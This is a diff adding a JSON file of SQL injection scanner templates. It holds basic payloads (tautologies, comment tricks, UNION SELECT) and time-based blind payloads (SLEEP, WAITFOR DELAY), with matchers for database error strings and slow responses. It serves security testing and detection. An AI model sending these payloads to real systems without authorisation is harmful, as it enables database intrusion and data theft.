@@ -1,0 +1,103 @@
+[
+  {
+    "id": "sqli-basic",
+    "info": {
+      "name": "SQL Injection - Basic Tests",
+      "severity": "critical",
+      "category": "injection",
+      "description": "Tests for basic SQL injection vulnerabilities",
+      "references": [
+        "https://owasp.org/www-community/attacks/SQL_Injection",
+        "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
+      ],
+      "tags": [
+        "sqli",
+        "injection",
+        "database"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "' OR '1'='1",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "' OR 1=1--",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "admin' --",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "' UNION SELECT NULL--",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "1' AND '1'='1",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_body",
+        "condition": "contains",
+        "patterns": [
+          "SQL syntax",
+          "mysql_fetch",
+          "ORA-",
+          "PostgreSQL",
+          "sqlite_"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "sqli-advanced",
+    "info": {
+      "name": "SQL Injection - Advanced Techniques",
+      "severity": "critical",
+      "category": "injection",
+      "description": "Advanced SQL injection with time-based and boolean-based tests",
+      "references": [
+        "https://owasp.org/www-community/attacks/SQL_Injection"
+      ],
+      "tags": [
+        "sqli",
+        "injection",
+        "blind"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "1' AND SLEEP(5)--",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "1' WAITFOR DELAY '0:0:5'--",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_time",
+        "condition": "greater_than",
+        "patterns": [
+          "5000"
+        ]
+      }
+    ]
+  }
+]
